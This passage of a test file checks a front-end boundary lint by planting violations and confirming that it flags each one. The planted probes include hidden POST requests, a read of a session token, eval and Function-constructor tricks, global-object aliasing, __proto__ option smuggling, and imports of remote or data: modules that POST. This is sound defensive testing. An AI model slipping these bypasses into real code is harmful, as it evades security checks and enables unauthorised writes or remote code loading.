// The boundary lint (scripts/check-boundaries.mjs) against planted violations. Each case copies
// src/ into a temporary directory, plants one change, runs the lint's checkBoundaries() on the
// copy, and checks its verdict. The groups: the audit's probes (review WEB-1), the other
// forbidden APIs and the loader's fetch rule, the round-1 verifier's bypasses (B1-B15 and the
// direct form of B16, all of which must now fail), the round-2 verifier's bypasses (N1-N20 and
// the loader's Request-input and __proto__ probes), the round-3 verifier's bypasses (V1 prototype
// getters, U1 .js and .mjs sources, G1-G2 literal-key and logical aliases of the global object),
// the round-4 verifier's bypasses (X4 modules outside src, X1-X3 files Vite bundles as code
// although their extension is not a script's, and the fail-closed writes to globals), changes
// that must still pass (comments, CSS and JSON imports, allowed loader forms), and the
// documented known evasions, which still pass so that the lint header and web/README.md stay
// accurate. Two cases run the script itself to check its exit status.

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import {
  appendFileSync,
  cpSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, before, test } from "node:test";
import { fileURLToPath, pathToFileURL } from "node:url";

const WEB = fileURLToPath(new URL("..", import.meta.url));
const SCRIPT = join(WEB, "scripts", "check-boundaries.mjs");
const LOADER = "src/replay/loader.ts";

interface LintResult {
  readonly problems: readonly string[];
  readonly readOnlyModules: number;
  readonly sources: number;
}

const { checkBoundaries } = (await import(pathToFileURL(SCRIPT).href)) as {
  checkBoundaries: (root: string) => LintResult;
};

type Plant = (root: string) => void;

interface Case {
  readonly name: string;
  readonly plant: Plant;
  /** The start of a line of the lint's report that names this violation. */
  readonly expect: string;
}

let work = "";
let copies = 0;

before(() => {
  work = mkdtempSync(join(tmpdir(), "planb-lint-"));
});

after(() => {
  rmSync(work, { recursive: true, force: true });
});

function copyWith(plant: Plant): string {
  copies += 1;
  const root = join(work, `case-${copies}`);
  cpSync(join(WEB, "src"), join(root, "src"), { recursive: true });
  plant(root);
  return root;
}

const lint = (plant: Plant): LintResult => checkBoundaries(copyWith(plant));
const report = (result: LintResult): string => result.problems.join("\n");

/** Add a new source file (and its folder). */
const add =
  (path: string, text: string): Plant =>
  (root) => {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), text);
  };

/** Append to an existing source file. */
const append =
  (path: string, text: string): Plant =>
  (root) => {
    appendFileSync(join(root, path), text);
  };

/** Replace text that must exist in a copied source file. */
const edit =
  (path: string, from: string, to: string): Plant =>
  (root) => {
    const file = join(root, path);
    const text = readFileSync(file, "utf-8");
    assert.ok(text.includes(from), `${path} no longer contains ${JSON.stringify(from)}`);
    writeFileSync(file, text.replace(from, to));
  };

const both =
  (...plants: Plant[]): Plant =>
  (root) => {
    for (const plant of plants) plant(root);
  };

const REACHES_API = (from: string): string => `read-only module reaches a mutating module: ${from} -> src/api.ts`;
const METHOD_NOT_GET = `${LOADER}: fetch method must be the string literal "GET" (any case)`;
const METHOD_MISSING = `${LOADER}: fetch options must set method: "GET"`;
const NOT_DIRECT = `${LOADER}: fetch is used other than as a direct call fetch(url, OPTIONS)`;
const LOADER_CALL = `${LOADER}: fetch must be called as fetch(url, OPTIONS), OPTIONS a top-level const of the loader`;
const LOADER_OPTIONS =
  `${LOADER}: fetch options must be built as Object.freeze(Object.assign(Object.create(null), { ... })): ` +
  "with no prototype and frozen, so no inherited or added key reaches the request";
/** The loader's one fetch call, and the head of its options const. */
const LOADER_FETCH = "response = await fetch(path, GET_ONLY);";
const OPTIONS_HEAD = "const GET_ONLY: RequestInit = Object.freeze(\n  Object.assign(Object.create(null) as RequestInit, {";
const ONLY_KEYS = (key: string): string =>
  `${LOADER}: fetch options may only use the keys method, credentials, cache, signal, redirect, mode, ` +
  `referrer, referrerPolicy, integrity, priority (not ${JSON.stringify(key)})`;
const URL_IMPORT = (file: string, spec: string): string => `${file}: imports a URL module specifier "${spec}`;

const AUDIT_PROBES: readonly Case[] = [
  {
    name: "a component imports src/api.ts",
    plant: add("src/components/Probe.ts", 'import { callTool } from "../api";\nexport const probe = callTool;\n'),
    expect: REACHES_API("src/components/Probe.ts"),
  },
  {
    name: "a component POSTs with fetch",
    plant: add(
      "src/components/Probe.ts",
      'export const probe = () => fetch("/api/tools/apply_plan", { method: "POST" });\n',
    ),
    expect: "src/components/Probe.ts: read-only module uses fetch",
  },
  {
    name: 'replay code outside the loader fetches with method "POST"',
    plant: add("src/replay/probe.ts", 'export const probe = () => fetch("/api/moderator/clock", { method: "POST" });\n'),
    expect: "src/replay/probe.ts: read-only module uses fetch",
  },
  {
    name: 'the loader sends method "POST"',
    plant: edit(LOADER, 'method: "GET"', 'method: "POST"'),
    expect: METHOD_NOT_GET,
  },
  {
    name: 'the loader sends method "post"',
    plant: edit(LOADER, 'method: "GET"', 'method: "post"'),
    expect: METHOD_NOT_GET,
  },
  {
    name: "the loader takes its method from a variable",
    plant: both(
      edit(LOADER, 'method: "GET"', "method: M"),
      edit(LOADER, "async function getBytes", 'const M = "POST";\nasync function getBytes'),
    ),
    expect: METHOD_NOT_GET,
  },
  {
    name: "a board module reads the session token",
    plant: add("src/board/probe.ts", 'export const token = sessionStorage.getItem("planb.session");\n'),
    expect: "src/board/probe.ts: read-only module uses sessionStorage",
  },
  {
    name: "a board module imports src/api.ts with a backtick specifier",
    plant: add("src/board/probe.ts", "export const api = () => import(`../api`);\n"),
    expect: "src/board/probe.ts: dynamic import() must take a quoted literal specifier",
  },
  {
    name: "a board module POSTs with XMLHttpRequest",
    plant: add(
      "src/board/probe.ts",
      'const x = new XMLHttpRequest();\nx.open("POST", "/api/moderator/clock");\nx.send();\n',
    ),
    expect: "src/board/probe.ts: read-only module uses XMLHttpRequest",
  },
];

const MORE_PROBES: readonly Case[] = [
  {
    name: "a component uses navigator.sendBeacon",
    plant: add("src/components/Probe.ts", 'export const probe = () => navigator.sendBeacon("/api/tools/x", "{}");\n'),
    expect: "src/components/Probe.ts: read-only module uses sendBeacon",
  },
  {
    name: "a component opens a WebSocket",
    plant: add("src/components/Probe.ts", 'export const probe = () => new WebSocket("ws://127.0.0.1:8765/");\n'),
    expect: "src/components/Probe.ts: read-only module uses WebSocket",
  },
  {
    name: "a component opens an EventSource",
    plant: add("src/components/Probe.ts", 'export const probe = () => new EventSource("/api/events");\n'),
    expect: "src/components/Probe.ts: read-only module uses EventSource",
  },
  {
    name: "a component builds a Request",
    plant: add(
      "src/components/Probe.ts",
      'export const probe = () => new globalThis.Request("/api/tools/x", { method: "POST" });\n',
    ),
    expect: "src/components/Probe.ts: read-only module uses the Request constructor",
  },
  {
    name: "a board module writes localStorage",
    plant: add("src/board/probe.ts", 'localStorage.setItem("planb.session", "x");\n'),
    expect: "src/board/probe.ts: uses localStorage (tokens must stay per tab)",
  },
  {
    name: "a panel writes localStorage",
    plant: add("src/panels/probe.ts", 'localStorage.setItem("planb.session", "x");\n'),
    expect: "src/panels/probe.ts: uses localStorage (tokens must stay per tab)",
  },
  {
    name: "a board module opens indexedDB",
    plant: add("src/board/probe.ts", 'export const probe = () => indexedDB.open("planb");\n'),
    expect: "src/board/probe.ts: read-only module uses indexedDB",
  },
  {
    name: "a component renders a form",
    plant: add(
      "src/components/Probe.tsx",
      'export const Probe = () => <form method="post" action="/api/moderator/clock" />;\n',
    ),
    expect: "src/components/Probe.tsx: read-only module uses <form>",
  },
  {
    name: "format.ts calls fetch",
    plant: append("src/format.ts", '\nexport const probe = () => fetch("/api/state");\n'),
    expect: "src/format.ts: read-only module uses fetch",
  },
  {
    name: "a board module imports a helper outside the read-only folders that fetches",
    plant: both(
      add("src/net.ts", 'export const post = () => fetch("/api/tools/x", { method: "POST" });\n'),
      add("src/board/probe.ts", 'import { post } from "../net";\nexport const probe = post;\n'),
    ),
    expect: "src/net.ts: read-only module uses fetch",
  },
  {
    name: "a component imports src/api.ts by a root-absolute path",
    plant: add("src/components/Probe.ts", 'import { callTool } from "/src/api";\nexport const probe = callTool;\n'),
    expect: REACHES_API("src/components/Probe.ts"),
  },
  {
    name: "a component re-exports src/api.ts through another module",
    plant: both(
      add("src/relay.ts", 'export * from "./api";\n'),
      add("src/components/Probe.ts", 'export { callTool } from "../relay";\n'),
    ),
    expect: "read-only module reaches a mutating module: src/components/Probe.ts -> src/relay.ts -> src/api.ts",
  },
  {
    name: "a component imports src/api.ts with a .js extension",
    plant: add("src/components/Probe.ts", 'import { callTool } from "../api.js";\nexport const probe = callTool;\n'),
    expect: REACHES_API("src/components/Probe.ts"),
  },
  {
    name: "a component imports a panel by a quoted dynamic import",
    plant: add("src/components/Probe.ts", 'export const panel = () => import("../panels/ModeratorPanel");\n'),
    expect: "read-only module reaches a mutating module: src/components/Probe.ts -> src/panels/ModeratorPanel.tsx",
  },
  {
    name: "a board module imports a computed specifier",
    plant: add("src/board/probe.ts", 'const name = "../api";\nexport const api = () => import(name);\n'),
    expect: "src/board/probe.ts: dynamic import() must take a quoted literal specifier",
  },
  {
    name: "a panel imports a computed specifier",
    plant: add("src/panels/probe.ts", "export const load = (name: string) => import(name);\n"),
    expect: "src/panels/probe.ts: dynamic import() must take a quoted literal specifier",
  },
  {
    name: "a component imports a missing module",
    plant: add("src/components/Probe.ts", 'import "./does-not-exist";\n'),
    expect: 'src/components/Probe.ts: cannot resolve import "./does-not-exist"',
  },
  {
    name: "a source does not parse",
    plant: add("src/panels/probe.ts", "export const = ;\n"),
    expect: "src/panels/probe.ts: does not parse:",
  },
  {
    name: "a component uses dangerouslySetInnerHTML",
    plant: add("src/components/Probe.tsx", 'export const Probe = () => <div dangerouslySetInnerHTML={{ __html: "x" }} />;\n'),
    expect: "src/components/Probe.tsx: uses dangerouslySetInnerHTML",
  },
  {
    name: "a panel sets an Authorization header",
    plant: add("src/panels/probe.ts", 'export const headers = { Authorization: "x" };\n'),
    expect: "src/panels/probe.ts: sets authorization outside src/api.ts",
  },
  {
    name: "a panel builds a bearer token string",
    plant: add("src/panels/probe.ts", "export const auth = (t: string) => `Bearer ${t}`;\n"),
    expect: "src/panels/probe.ts: sets authorization outside src/api.ts",
  },
  {
    name: "a panel sets the header by name",
    plant: add("src/panels/probe.ts", 'export const set = (h: Headers) => h.set("authorization", "x");\n'),
    expect: "src/panels/probe.ts: sets authorization outside src/api.ts",
  },
  {
    name: "a source names a private runner marker",
    plant: add("src/panels/probe.ts", "// never_expose_to_agent\nexport {};\n"),
    expect: 'src/panels/probe.ts: contains private marker "never_expose_to_agent"',
  },
  {
    name: "the loader spreads its fetch options",
    plant: edit(LOADER, 'method: "GET",', '...{ method: "POST" },'),
    expect: `${LOADER}: fetch options must not use a spread`,
  },
  {
    name: "the loader passes its fetch options inline, as an object literal",
    plant: edit(LOADER, LOADER_FETCH, 'response = await fetch(path, { method: "GET", cache: "no-store", credentials: "omit" });'),
    expect: LOADER_CALL,
  },
  {
    name: "the loader passes its fetch options in a local variable",
    plant: edit(LOADER, LOADER_FETCH, "const init = GET_ONLY;\n    response = await fetch(path, init);"),
    expect: `${LOADER_CALL} (init is not declared once as a top-level const)`,
  },
  {
    name: "the loader sends credentials",
    plant: edit(LOADER, 'credentials: "omit"', 'credentials: "include"'),
    expect: `${LOADER}: fetch options must set credentials: "omit"`,
  },
  {
    name: "the loader drops credentials: omit",
    plant: edit(LOADER, '    credentials: "omit",\n', ""),
    expect: `${LOADER}: fetch options must set credentials: "omit"`,
  },
  {
    name: "the loader sends a body",
    plant: edit(LOADER, 'cache: "no-store",', 'cache: "no-store",\n      body: "{}",'),
    expect: `${LOADER}: fetch options must not carry a body`,
  },
  {
    name: "the loader aliases fetch",
    plant: append(LOADER, "\nexport const send = fetch;\n"),
    expect: NOT_DIRECT,
  },
  {
    name: "the loader calls fetch through globalThis",
    plant: edit(LOADER, LOADER_FETCH, "response = await globalThis.fetch(path, GET_ONLY);"),
    expect: NOT_DIRECT,
  },
  {
    name: 'the loader builds its method as "GET" + x',
    plant: edit(LOADER, 'method: "GET",', 'method: "GET" + "",'),
    expect: METHOD_NOT_GET,
  },
  {
    name: "the loader gives its options a method getter",
    plant: edit(LOADER, 'method: "GET",', 'get method() { return "POST"; },'),
    expect: `${LOADER}: fetch options must be plain properties with identifier or string keys`,
  },
  {
    name: "the loader takes its method from a shorthand property",
    plant: both(
      edit(LOADER, 'method: "GET",', "method,"),
      edit(LOADER, "async function getBytes", 'const method = "POST";\nasync function getBytes'),
    ),
    expect: METHOD_NOT_GET,
  },
];

// Every bypass the round-1 verifier reported (verify:web, cases B1-B16), each now caught.
const ROUND_1_BYPASSES: readonly Case[] = [
  {
    name: "B1: a multi-line import with an apostrophe in a trailing comment",
    plant: add(
      "src/board/Probe.ts",
      'import {\n  loadSession, // the board\'s own copy\n} from "../api";\nexport const probe = loadSession;\n',
    ),
    expect: REACHES_API("src/board/Probe.ts"),
  },
  {
    name: "B2: an import with no space before the specifier",
    plant: add("src/board/Probe.ts", 'import { loadSession } from"../api";\nexport const probe = loadSession;\n'),
    expect: REACHES_API("src/board/Probe.ts"),
  },
  {
    name: "B3: an import with no spaces at all",
    plant: add("src/board/Probe.ts", 'import{loadSession}from"../api";\nexport const probe = loadSession;\n'),
    expect: REACHES_API("src/board/Probe.ts"),
  },
  {
    name: "B4: a semicolon inside a comment in the import braces",
    plant: add(
      "src/board/Probe.ts",
      'import { loadSession /* a; b */ } from "../api";\nexport const probe = loadSession;\n',
    ),
    expect: REACHES_API("src/board/Probe.ts"),
  },
  {
    name: "B5: a string-named import",
    plant: add("src/board/Probe.ts", 'import { "loadSession" as ls } from "../api";\nexport const probe = ls;\n'),
    expect: REACHES_API("src/board/Probe.ts"),
  },
  {
    name: "B7: import.meta.glob of src/api.ts",
    plant: add("src/board/Probe.ts", 'export const m = import.meta.glob("/src/api.ts", { eager: true });\n'),
    expect: "src/board/Probe.ts: read-only module uses import.meta.glob",
  },
  {
    name: "B8: a Worker built from a module that POSTs",
    plant: both(
      add("src/work/net.ts", 'fetch("/api/tools/apply_plan", { method: "POST" });\nexport {};\n'),
      add(
        "src/board/Probe.ts",
        'export const w = () => new Worker(new URL("../work/net.ts", import.meta.url), { type: "module" });\n',
      ),
    ),
    expect: "src/board/Probe.ts: read-only module uses Worker",
  },
  {
    name: "B9: a form created through the DOM and submitted",
    plant: add(
      "src/components/Probe.ts",
      'export const go = () => {\n  const f = document.createElement("form");\n  f.method = "post";\n  f.submit();\n};\n',
    ),
    expect: "src/components/Probe.ts: read-only module uses <form>",
  },
  {
    name: "B10: an <a ping> attribute",
    plant: add(
      "src/components/Probe.tsx",
      'export const Probe = () => <a href="#/" ping="/api/tools/apply_plan">x</a>;\n',
    ),
    expect: "src/components/Probe.tsx: read-only module uses a ping attribute",
  },
  {
    name: 'B11: the loader\'s method "GET".replace("GET", "POST")',
    plant: edit(LOADER, 'method: "GET",', 'method: "GET".replace("GET", "POST"),'),
    expect: METHOD_NOT_GET,
  },
  {
    name: "B12: the loader's computed method key",
    plant: both(
      edit(LOADER, 'method: "GET",', '[METHOD]: "POST",'),
      edit(LOADER, "async function getBytes", 'const METHOD = "met" + "hod";\nasync function getBytes'),
    ),
    expect: `${LOADER}: fetch options must be plain properties with identifier or string keys`,
  },
  {
    name: "B13: the loader's quoted method key",
    plant: edit(LOADER, 'method: "GET",', "'method': \"POST\","),
    expect: METHOD_NOT_GET,
  },
  {
    name: "B13: the loader's unicode-escaped method key",
    plant: edit(LOADER, 'method: "GET",', '\\u006dethod: "POST",'),
    expect: METHOD_NOT_GET,
  },
  {
    name: "B14: the loader's computed credentials key",
    plant: both(
      edit(LOADER, 'method: "GET",', 'method: "GET",\n      [CRED]: "include",'),
      edit(LOADER, "async function getBytes", 'const CRED = "creden" + "tials";\nasync function getBytes'),
    ),
    expect: `${LOADER}: fetch options must be plain properties with identifier or string keys`,
  },
  {
    name: "B15: a unicode-escaped fetch identifier",
    plant: add(
      "src/components/Probe.ts",
      'export const probe = () => \\u0066etch("/api/tools/apply_plan", { method: "POST" });\n',
    ),
    expect: "src/components/Probe.ts: read-only module uses fetch",
  },
  {
    // The round-1 case itself indexed an alias (`const g = globalThis; g["fe" + "tch"]`), which
    // is a known evasion (KNOWN_EVASIONS below); this is the form without the alias.
    name: "B16, direct form: globalThis itself indexed by a built-up name",
    plant: add(
      "src/components/Probe.ts",
      'export const probe = () => (globalThis as any)["fe" + "tch"]("/api/tools/x", { method: "POST" });\n',
    ),
    expect: "src/components/Probe.ts: read-only module uses computed element access on globalThis",
  },
];

// The other rules the AST lint adds, and their variants.
const NEW_RULES: readonly Case[] = [
  {
    name: "a component spawns a SharedWorker",
    plant: add("src/components/Probe.ts", 'export const w = () => new SharedWorker("/x.js");\n'),
    expect: "src/components/Probe.ts: read-only module uses SharedWorker",
  },
  {
    name: "a board module imports a module as a Vite worker",
    plant: both(
      add("src/work/net.ts", "export {};\n"),
      add("src/board/Probe.ts", 'import NetWorker from "../work/net.ts?worker";\nexport const w = NetWorker;\n'),
    ),
    expect: 'src/board/Probe.ts: read-only module imports "../work/net.ts?worker" as a worker',
  },
  {
    name: "a component renders an iframe",
    plant: add("src/components/Probe.tsx", 'export const Probe = () => <iframe src="/api/state" />;\n'),
    expect: "src/components/Probe.tsx: read-only module uses <iframe>",
  },
  {
    name: "a component creates an iframe through the DOM",
    plant: add("src/components/Probe.ts", 'export const f = () => document.createElement("IFRAME");\n'),
    expect: "src/components/Probe.ts: read-only module uses <iframe>",
  },
  {
    name: "a component creates a script through the DOM",
    plant: add("src/components/Probe.ts", 'export const s = () => document.createElement("script");\n'),
    expect: "src/components/Probe.ts: read-only module uses <script>",
  },
  {
    name: "a component creates a form with React's createElement",
    plant: add(
      "src/components/Probe.ts",
      'import { createElement } from "react";\nexport const f = () => createElement("form", { method: "post" });\n',
    ),
    expect: "src/components/Probe.ts: read-only module uses <form>",
  },
  {
    name: "a component creates an element with a computed tag",
    plant: add("src/components/Probe.ts", "export const f = (tag: string) => document.createElement(tag);\n"),
    expect: "src/components/Probe.ts: read-only module uses document.createElement with a computed tag",
  },
  {
    name: "a component sets a ping attribute through the DOM",
    plant: add("src/components/Probe.ts", 'export const p = (a: HTMLAnchorElement) => a.setAttribute("ping", "/x");\n'),
    expect: "src/components/Probe.ts: read-only module uses a ping attribute",
  },
  {
    name: "a component indexes window with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (window as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on window",
  },
  {
    name: "a component indexes self.top with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (self.top as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on self.top",
  },
  {
    name: "a component indexes window with a quoted forbidden name",
    plant: add("src/components/Probe.ts", 'export const g = () => (window as any)["sendBeacon"];\n'),
    expect: "src/components/Probe.ts: read-only module uses sendBeacon",
  },
  {
    name: "a component spells a forbidden name with string escapes",
    plant: add("src/components/Probe.ts", 'export const g = () => Reflect.get(globalThis, "\\u0066etch");\n'),
    expect: "src/components/Probe.ts: read-only module uses fetch",
  },
  {
    name: "a component destructures fetch from window",
    plant: add("src/components/Probe.ts", "export const g = () => { const { fetch: f } = window; return f; };\n"),
    expect: "src/components/Probe.ts: read-only module uses fetch",
  },
  {
    name: "a component calls eval",
    plant: add("src/components/Probe.ts", 'export const e = () => eval("1");\n'),
    expect: "src/components/Probe.ts: read-only module uses eval",
  },
  {
    name: "a component uses the Function constructor",
    plant: add("src/components/Probe.ts", 'export const f = () => new Function("return 1");\n'),
    expect: "src/components/Probe.ts: read-only module uses the Function constructor",
  },
  {
    name: "a component reaches the Function constructor through .constructor.constructor",
    plant: add("src/components/Probe.ts", 'export const f = () => [].constructor.constructor("return 1");\n'),
    expect: "src/components/Probe.ts: read-only module uses the Function constructor",
  },
  {
    name: "a component class extends Worker",
    plant: add("src/components/Probe.ts", "export class W extends Worker {}\n"),
    expect: "src/components/Probe.ts: read-only module uses Worker",
  },
  {
    name: "a component reads import.meta.hot",
    plant: add("src/components/Probe.ts", "export const h = () => import.meta.hot;\n"),
    expect: "src/components/Probe.ts: read-only module uses import.meta.hot",
  },
];

// The loader's GET-only rule: the method stated, the keys from an allowlist (round-2 verify:web),
// and options with no prototype, frozen, in a top-level const (round-3 verify:web, V1).
const REQUEST_INPUT = 'response = await fetch(new R(path, { method: "POST", body: "{}" }), GET_ONLY);';
const LOADER_INIT: readonly Case[] = [
  {
    name: "the loader omits the method",
    plant: edit(LOADER, '    method: "GET",\n', ""),
    expect: METHOD_MISSING,
  },
  {
    // The verifier's probe, verbatim: the Request carries a POST and a body.
    name: "the loader fetches a Request built through an alias of Request",
    plant: both(
      edit(LOADER, "async function getBytes", "const R = Request;\nasync function getBytes"),
      edit(LOADER, LOADER_FETCH, REQUEST_INPUT),
    ),
    expect: `${LOADER}: read-only module uses the Request constructor`,
  },
  {
    name: "the loader fetches a Request input and drops its own method",
    plant: both(
      edit(LOADER, "async function getBytes", "const R = Request;\nasync function getBytes"),
      edit(LOADER, LOADER_FETCH, REQUEST_INPUT),
      edit(LOADER, '    method: "GET",\n', ""),
    ),
    expect: METHOD_MISSING,
  },
  {
    name: "the loader fetches a Request made by Reflect.construct",
    plant: edit(
      LOADER,
      LOADER_FETCH,
      'response = await fetch(Reflect.construct(Request, [path, { method: "POST", body: "{}" }]), GET_ONLY);',
    ),
    expect: `${LOADER}: read-only module uses the Request constructor`,
  },
  {
    // The verifier's probe, verbatim: the init would inherit method and body from its prototype.
    name: "the loader replaces its method with a __proto__ key",
    plant: edit(
      LOADER,
      'method: "GET",',
      '// @ts-expect-error inherited init\n      __proto__: { method: "POST", body: "{}" },',
    ),
    expect: ONLY_KEYS("__proto__"),
  },
  {
    name: "the loader adds a quoted __proto__ key beside its method",
    plant: edit(LOADER, 'method: "GET",', 'method: "GET",\n      "__proto__": { body: "{}" },'),
    expect: ONLY_KEYS("__proto__"),
  },
  {
    name: "the loader sends headers",
    plant: edit(
      LOADER,
      'cache: "no-store",',
      'cache: "no-store",\n      headers: { "X-HTTP-Method-Override": "POST" },',
    ),
    expect: ONLY_KEYS("headers"),
  },
  {
    name: "the loader sets keepalive",
    plant: edit(LOADER, 'cache: "no-store",', 'cache: "no-store",\n      keepalive: true,'),
    expect: ONLY_KEYS("keepalive"),
  },
  {
    // Frozen, but with Object.prototype: an inherited headers or body key still reaches the request.
    name: "the loader's options are a frozen literal that keeps Object.prototype",
    plant: edit(
      LOADER,
      OPTIONS_HEAD,
      "const GET_ONLY: RequestInit = Object.freeze(\n  Object.assign({} as RequestInit, {",
    ),
    expect: LOADER_OPTIONS,
  },
  {
    name: "the loader's options are frozen but made with Object.freeze({ ... }) alone",
    plant: both(
      edit(LOADER, OPTIONS_HEAD, "const GET_ONLY: RequestInit = Object.freeze({"),
      edit(LOADER, "  } satisfies RequestInit),\n);", "});"),
    ),
    expect: LOADER_OPTIONS,
  },
  {
    name: "the loader's options are not frozen",
    plant: both(
      edit(LOADER, OPTIONS_HEAD, "const GET_ONLY: RequestInit = Object.assign(Object.create(null) as RequestInit, {"),
      edit(LOADER, "  } satisfies RequestInit),\n);", "} satisfies RequestInit);"),
    ),
    expect: LOADER_OPTIONS,
  },
  {
    name: "the loader's options get Object.prototype from Object.create",
    plant: edit(LOADER, "Object.create(null)", "Object.create(Object.prototype)"),
    expect: LOADER_OPTIONS,
  },
  {
    name: "the loader declares its own Object",
    plant: append(LOADER, "\nfunction Object() {}\n"),
    expect: LOADER_OPTIONS,
  },
  {
    name: "the loader's options are a let",
    plant: edit(LOADER, "const GET_ONLY: RequestInit =", "let GET_ONLY: RequestInit ="),
    expect: `${LOADER_CALL} (GET_ONLY is not declared once as a top-level const)`,
  },
  {
    name: "the loader shadows its options inside the function",
    plant: edit(LOADER, "  let response: Response;", '  const GET_ONLY = { method: "POST" } as RequestInit;\n  let response: Response;'),
    expect: `${LOADER_CALL} (GET_ONLY is not declared once as a top-level const)`,
  },
  {
    name: "the loader imports its options from another module",
    plant: both(
      add("src/replay/options.ts", 'export const OPTIONS: RequestInit = { method: "GET", body: "{}" };\n'),
      edit(LOADER, LOADER_FETCH, "response = await fetch(path, OPTIONS);"),
      edit(LOADER, 'import type { SanitizedTrace } from "../types";', 'import type { SanitizedTrace } from "../types";\nimport { OPTIONS } from "./options";'),
    ),
    expect: `${LOADER_CALL} (OPTIONS is not declared once as a top-level const)`,
  },
  {
    name: "the loader passes a third argument to fetch",
    plant: edit(LOADER, LOADER_FETCH, "response = await fetch(path, GET_ONLY, 0 as never);"),
    expect: LOADER_CALL,
  },
  {
    name: "the loader passes its options behind a comma",
    plant: edit(LOADER, LOADER_FETCH, "response = await fetch(path, (0, GET_ONLY));"),
    expect: LOADER_CALL,
  },
  {
    name: "the loader builds its options behind a comma",
    plant: both(
      edit(LOADER, OPTIONS_HEAD, "const GET_ONLY: RequestInit = Object.freeze((0,\n  Object.assign(Object.create(null) as RequestInit, {"),
      edit(LOADER, "  } satisfies RequestInit),\n);", "  } satisfies RequestInit)),\n);"),
    ),
    expect: LOADER_OPTIONS,
  },
];

// URL module specifiers, refused in every source (round-2 N10 and N11).
const URL_SPECIFIERS: readonly Case[] = [
  {
    name: "a component imports a data: module that POSTs (N10)",
    plant: both(
      add(
        "src/components/Probe.ts",
        "import \"data:text/javascript,fetch('/api/tools/apply_plan',{method:'POST',body:'{}'})\";\n" +
          "export const probe = 1;\n",
      ),
      edit("src/board/BoardView.tsx", "import ", 'import "../components/Probe";\nimport '),
    ),
    expect: URL_IMPORT("src/components/Probe.ts", "data:text/javascript,fetch('/api/tools/apply_..."),
  },
  {
    name: "a component imports an https: module (N11)",
    plant: add("src/components/Probe.ts", 'import "https://example.invalid/post.js";\nexport const probe = 1;\n'),
    expect: URL_IMPORT("src/components/Probe.ts", "https://example.invalid/post.js"),
  },
  {
    name: "a component imports a protocol-relative module",
    plant: add("src/components/Probe.ts", 'import "//example.invalid/post.js";\nexport const probe = 1;\n'),
    expect: URL_IMPORT("src/components/Probe.ts", "//example.invalid/post.js"),
  },
  {
    name: "a component imports a DATA: module in upper case",
    plant: add("src/components/Probe.ts", 'import "DATA:text/javascript,1";\nexport const probe = 1;\n'),
    expect: URL_IMPORT("src/components/Probe.ts", "DATA:text/javascript,1"),
  },
  {
    name: "a panel re-exports an http: module",
    plant: add("src/panels/probe.ts", 'export * from "http://127.0.0.1:8765/x.js";\n'),
    expect: URL_IMPORT("src/panels/probe.ts", "http://127.0.0.1:8765/x.js"),
  },
  {
    name: "a view re-exports a name from an https: module",
    plant: add("src/views/probe.ts", 'export { x } from "https://example.invalid/x.js";\n'),
    expect: URL_IMPORT("src/views/probe.ts", "https://example.invalid/x.js"),
  },
  {
    name: "a source outside the read-only folders dynamically imports a blob: module",
    plant: add("src/probe.ts", 'export const m = () => import("blob:http://127.0.0.1:8765/0f1e");\n'),
    expect: URL_IMPORT("src/probe.ts", "blob:http://127.0.0.1:8765/0f1e"),
  },
  {
    name: "a component requires a file: module",
    plant: add("src/components/Probe.ts", 'import x = require("file:///tmp/x.js");\nexport const probe = x;\n'),
    expect: URL_IMPORT("src/components/Probe.ts", "file:///tmp/x.js"),
  },
];

// The round-2 verifier's lint bypasses with a cheap syntax rule (verify:web, cases N1-N20).
const ROUND_2_BYPASSES: readonly Case[] = [
  {
    name: "N1: a bare top indexed with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (top as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on top",
  },
  {
    name: "N2: a bare parent indexed with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (parent as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on parent",
  },
  {
    name: "N3: a bare frames indexed with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (frames as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on frames",
  },
  {
    name: "N4: document.defaultView indexed with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (document.defaultView as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on document.defaultView",
  },
  {
    name: "N5: globalThis behind a comma, indexed with a computed key",
    plant: add("src/components/Probe.ts", "export const g = (k: string) => (0, globalThis as any)[k];\n"),
    expect: "src/components/Probe.ts: read-only module uses computed element access on globalThis",
  },
  {
    name: "N6: a computed key destructured from globalThis",
    plant: add(
      "src/components/Probe.ts",
      "export const g = (k: string) => {\n  const { [k]: f } = globalThis as any;\n  return f;\n};\n",
    ),
    expect: "src/components/Probe.ts: read-only module uses computed destructuring of globalThis",
  },
  {
    name: "N6: a computed key destructured from window in an assignment",
    plant: add(
      "src/components/Probe.ts",
      "let f: unknown;\nexport const g = (k: string) => ({ [k]: f } = window as any);\nexport const h = () => f;\n",
    ),
    expect: "src/components/Probe.ts: read-only module uses computed destructuring of window",
  },
  {
    name: "N7: the Function constructor of an arrow function",
    plant: add("src/components/Probe.ts", 'export const f = () => (() => 0).constructor("return 1")();\n'),
    expect: "src/components/Probe.ts: read-only module uses the Function constructor",
  },
  {
    name: "N7: a named function's .constructor called with code",
    plant: add(
      "src/components/Probe.ts",
      'const id = () => 0;\nexport const f = () => (id.constructor as any)("return 1")();\n',
    ),
    expect: "src/components/Probe.ts: read-only module uses a call of .constructor(...)",
  },
  {
    name: 'N8: a form rendered through const Tag = "form"',
    plant: add(
      "src/components/Probe.tsx",
      'const Tag = "form";\nexport const P = () => <Tag method="post" action="/api/moderator/clock" />;\n',
    ),
    expect: "src/components/Probe.tsx: read-only module uses <form>",
  },
  {
    name: 'N8b: a polymorphic component rendered with as="form"',
    plant: add(
      "src/components/Probe.tsx",
